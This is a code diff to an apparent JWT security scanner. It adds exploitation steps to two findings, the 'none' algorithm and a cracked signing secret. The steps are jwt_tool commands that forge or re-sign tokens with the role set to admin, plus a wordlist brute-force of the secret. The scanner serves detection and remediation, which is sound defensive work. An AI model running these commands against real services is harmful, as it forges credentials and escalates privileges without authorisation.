@@ -125,7 +125,12 @@ def _analyse(token: str) -> list[Finding]:
             severity=Severity.CRITICAL,
             recommendation="Reject the 'none' algorithm; pin the expected algorithm server-side.",
             raw={"token": _redact(token), "alg": "none", "claims": payload, "confidence": "high",
-                 "attack": "T1606.001 Web Session Cookie / Forge Web Credentials"},
+                 "attack": "T1606.001 Web Session Cookie / Forge Web Credentials",
+                 "exploitation": [
+                     {"step": 1, "description": "Forge an unsigned token to bypass signature checks.",
+                      "command": "jwt_tool <token> -X a"},
+                     {"step": 2, "description": "Tamper a claim (e.g. become admin) and re-issue it.",
+                      "command": "jwt_tool <token> -X a -I -pc role -pv admin"}]},
         ))
 
     if alg in _HASHES:
@@ -142,7 +147,12 @@ def _analyse(token: str) -> list[Finding]:
                 recommendation=("Use a long, random, high-entropy signing key stored as a secret; "
                                 "rotate the current key immediately."),
                 raw={"token": _redact(token), "alg": alg, "secret": secret, "claims": payload,
-                     "confidence": "high", "attack": "T1552 Unsecured Credentials"},
+                     "confidence": "high", "attack": "T1552 Unsecured Credentials",
+                     "exploitation": [
+                         {"step": 1, "description": f"Mint an admin token signed with the cracked secret '{secret}'.",
+                          "command": f'jwt_tool <token> -S {alg.lower()} -p "{secret}" -I -pc role -pv admin'},
+                         {"step": 2, "description": "Or brute-force/confirm the secret with a wordlist.",
+                          "command": "jwt_tool <token> -C -d rockyou.txt"}]},
             ))
 
     # Informational: claims & expiry posture.
